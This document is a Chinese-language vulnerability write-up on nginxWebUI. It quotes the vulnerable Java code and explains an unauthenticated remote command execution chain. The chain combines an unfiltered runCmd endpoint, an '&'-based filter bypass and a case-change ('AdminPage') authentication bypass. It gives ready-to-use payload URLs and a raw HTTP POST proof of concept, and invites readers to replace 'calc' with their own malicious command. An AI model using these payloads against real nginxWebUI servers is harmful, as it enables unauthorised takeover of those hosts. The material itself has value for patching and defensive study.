## 一、漏洞描述
 nginxWebUI是一款图形化管理nginx配置的工具，能通过网页快速配置nginx的各种功能，包括HTTP和TCP协议转发、反向代理、负载均衡、静态HTML服务器以及SSL证书的自动申请、续签和配置，配置完成后可以一键生成nginx.conf文件，并控制nginx使用此文件进行启动和重载。
 nginxWebUI后台提供执行nginx相关命令的接口，由于未对用户的输入进行过滤，导致可在后台执行任意命令。并且该系统权限校验存在问题，导致存在权限绕过，在前台可直接调用后台接口，最终可以达到无条件远程命令执行的效果。
## 二、影响版本
nginxWebUI <= 3.5.2  未授权命令执行漏洞（网上公开为3.5.0 但下载后发现作者已删除GITEE中3.5.0的相应代码，下载3.5.0版本jar包反编译后发现并没有对权限绕过进行修复）
nginxWebUI 全版本均存在命令执行漏洞(文章截止最新版3.6.0)
## 三、漏洞详情
### 任意命令执行
#### 3.4.7 之前版本
漏洞存在点：`com/cym/controller/adminPage/ConfController.java(3.4.7版本之前)`
```java
@Controller
@Mapping("/adminPage/conf")
public class ConfController extends BaseController {
    ...
	@Mapping(value = "runCmd")
	public JsonResult runCmd(String cmd, String type) {
		if (StrUtil.isNotEmpty(type)) {
			settingService.set(type, cmd);
		}

		try {
			String rs = "";
			if (SystemTool.isWindows()) {
				RuntimeUtil.exec("cmd /c start " + cmd);
			} else {
				rs = RuntimeUtil.execForStr("/bin/sh", "-c", cmd);
			}

			cmd = "<span class='blue'>" + cmd + "</span>";
			if (StrUtil.isEmpty(rs) || rs.contains("已终止进程") //
					|| rs.contains("signal process started") //
					|| rs.toLowerCase().contains("terminated process") //
					|| rs.toLowerCase().contains("starting") //
					|| rs.toLowerCase().contains("stopping")) {
				return renderSuccess(cmd + "<br>" + m.get("confStr.runSuccess") + "<br>" + rs.replace("\n", "<br>"));
			} else {
				return renderSuccess(cmd + "<br>" + m.get("confStr.runFail") + "<br>" + rs.replace("\n", "<br>"));
			}
		} catch (Exception e) {
			logger.error(e.getMessage(), e);
			return renderSuccess(m.get("confStr.runFail") + "<br>" + e.getMessage().replace("\n", "<br>"));
		}
	}
```
`ConfController#runCmd()`方法中对传入 cmd 参数直接拼接到命令后执行命令
##### payload:
```java
http://localhost:8080/AdminPage/conf/runCmd?cmd=calc
```
#### 3.4.7  及之后版本
漏洞存在点：`com/cym/controller/adminPage/ConfController.java(3.4.7版本之后)`
```java
@Controller
@Mapping("/adminPage/conf")
public class ConfController extends BaseController {
    ...
	@Mapping(value = "runCmd")
    ///adminPage/conf/runCmd?cmd=恶意命令
	public JsonResult runCmd(String cmd, String type) {
		if (StrUtil.isNotEmpty(type)) {
			settingService.set(type, cmd);
		}

		try {
			String rs = "";
			// 过滤特殊字符，防止命令拼接
			cmd = cmd.replaceAll(";","\\\\;");
     		cmd = cmd.replaceAll("`","\\\\`");
     		cmd = cmd.replaceAll("\\|","\\\\|");
     		cmd = cmd.replaceAll("\\{","\\\\{");
     		cmd = cmd.replaceAll("\\}","\\\\}");
			//仅执行nginx相关的命令，而不是其他的恶意命令
			if(!cmd.contains("nginx")){
            	cmd = "nginx restart";
        	}
			if (SystemTool.isWindows()) {
				RuntimeUtil.exec("cmd /c start " + cmd);
			} else {
				rs = RuntimeUtil.execForStr("/bin/sh", "-c", cmd);
			}

			cmd = "<span class='blue'>" + cmd + "</span>";
			if (StrUtil.isEmpty(rs) || rs.contains("已终止进程") //
					|| rs.contains("signal process started") //
					|| rs.toLowerCase().contains("terminated process") //
					|| rs.toLowerCase().contains("starting") //
					|| rs.toLowerCase().contains("stopping")) {
				return renderSuccess(cmd + "<br>" + m.get("confStr.runSuccess") + "<br>" + rs.replace("\n", "<br>"));
			} else {
				return renderSuccess(cmd + "<br>" + m.get("confStr.runFail") + "<br>" + rs.replace("\n", "<br>"));
			}
		} catch (Exception e) {
			logger.error(e.getMessage(), e);
			return renderSuccess(m.get("confStr.runFail") + "<br>" + e.getMessage().replace("\n", "<br>"));
		}
	}
    ...
}
```
`ConfController#runCmd()`方法中对传入 cmd 进行过滤后拼接到命令后执行命令，绕过过滤需满足以下要求：

1. cmd 参数中存在 nginx
2. `";"  "`"  "\\|"  "\\{"  "\\}"`被过滤，可使用 & 绕过
##### payload：
```java
http://localhost:8080/AdminPage/conf/runCmd?cmd=calc%26%26nginx
```
### 权限绕过
#### 3.5.2 之前版本
 NginxWebUi 使用Solon开发框架，NginxWebUi 权限校验为`com/cym/config/AppFilter.java`
```java
@Component
public class AppFilter implements Filter {

    ...
	@Override
	public void doFilter(Context ctx, FilterChain chain) throws Throwable {
		// 全局过滤器
		if (!ctx.path().contains("/lib/") //
				&& !ctx.path().contains("/js/") //
				&& !ctx.path().contains("/doc/") //
				&& !ctx.path().contains("/img/") //
				&& !ctx.path().contains("/css/")) {
			frontInterceptor(ctx);
		}

		// 登录过滤器
		if (ctx.path().contains("/adminPage/") //
				&& !ctx.path().contains("/lib/") //
				&& !ctx.path().contains("/doc/") //
				&& !ctx.path().contains("/js/") //
				&& !ctx.path().contains("/img/") //
				&& !ctx.path().contains("/css/")) {
			if (!adminInterceptor(ctx)) {
				// 设置为已处理
				ctx.setHandled(true);
				return;
			}
		}

		// api过滤器
		if (ctx.path().contains("/api/") //
				&& !ctx.path().contains("/lib/") //
				&& !ctx.path().contains("/doc/") //
				&& !ctx.path().contains("/js/") //
				&& !ctx.path().contains("/img/") //
				&& !ctx.path().contains("/css/")) {
			if (!apiInterceptor(ctx)) {
				// 设置为已处理
				ctx.setHandled(true);
				return;
			}
		}

		chain.doFilter(ctx);

	}
    ...
}
```
根据以上源码可知若访问path 中包含 `/lib/  /adminPage/  /api/`且不包含`/lib/   /doc/  /js/   /img/  /css/`则进行权限校验，又因[Solon 对大小写不敏感](https://solon.noear.org/article/504)，故可使用大小写绕过权限校验
#### 3.5.2 之后版本
```java
@Component
public class AppFilter implements Filter {
	Logger logger = LoggerFactory.getLogger(this.getClass());
	@Inject
	AdminService adminService;
	@Inject
	MessageUtils m;
	@Inject
	CreditService creditService;
	@Inject("${solon.app.name}")
	String projectName;

	@Inject
	VersionConfig versionConfig;

	@Inject
	PropertiesUtils propertiesUtils;
	@Inject
	SettingService settingService;

	@Override
	public void doFilter(Context ctx, FilterChain chain) throws Throwable {
		
		String path = ctx.path().toLowerCase();
		
		// 全局过滤器
		if (!path.contains("/lib/") //
				&& !path.toLowerCase().contains("/js/") //
				&& !path.toLowerCase().contains("/doc/") //
				&& !path.toLowerCase().contains("/img/") //
				&& !path.toLowerCase().contains("/css/")) {
			frontInterceptor(ctx);
		}

		// 登录过滤器
		if (path.toLowerCase().contains("/adminPage/".toLowerCase()) //
				&& !path.contains("/lib/") //
				&& !path.contains("/doc/") //
				&& !path.contains("/js/") //
				&& !path.contains("/img/") //
				&& !path.contains("/css/")) {
			if (!adminInterceptor(ctx)) {
				// 设置为已处理
				ctx.setHandled(true);
				return;
			}
		}

		// api过滤器
		if (path.toLowerCase().contains("/api/") //
				&& !path.contains("/lib/") //
				&& !path.contains("/doc/") //
				&& !path.contains("/js/") //
				&& !path.contains("/img/") //
				&& !path.contains("/css/")) {
			if (!apiInterceptor(ctx)) {
				// 设置为已处理
				ctx.setHandled(true);
				return;
			}
		}

		chain.doFilter(ctx);

	}
}
```
3.5.0之后先对 path 进行处理再进行判断，权限绕过失败
## 四、漏洞利用
### 3.4.7 之前版本
```java
http://localhost:8080/AdminPage/conf/runCmd?cmd=calc
```
注：

- 原始路径为：`adminPage/conf/runCmd?cmd=calc%26%26nginx`  只需更改大小写使`adminPage`不为`adminPage`即可绕过权限校验
- calc 为要执行的恶意命令请自行更换
### 3.4.7  -- 3.5.2
```java
http://localhost:8080/AdminPage/conf/runCmd?cmd=calc%26%26nginx
```
注：

- 原始路径为：`adminPage/conf/runCmd?cmd=calc%26%26nginx`  只需更改大小写使`adminPage`不为`adminPage`即可绕过权限校验
- calc 为要执行的恶意命令请自行更换
- 作者已删除GITEE中3.5.0的相应代码，下载3.5.0版本jar包反编译后发现并没有对权限绕过进行修复
### 3.5.2 之后版本
3.5.2之后严格大小写，需登录后才可执行任意命令
```java
http://localhost:8080/adminPage/conf/runCmd?cmd=calc%26%26nginx
```



其他POC

POC1

```
POST /AdminPage/remote/cmdOver HTTP/1.1
Host: 192.168.2.146:8001
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.31(0x18001f2a) NetType/WIFI Language/zh_CN
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.2.146:8002/adminPage/remote
Content-Length: 40
Connection: close

remoteId=local&cmd=start|calc&interval=1
```

POC2

~~~
http://localhost:8080/AdminPage/conf/reload?nginxExe=calc
~~~

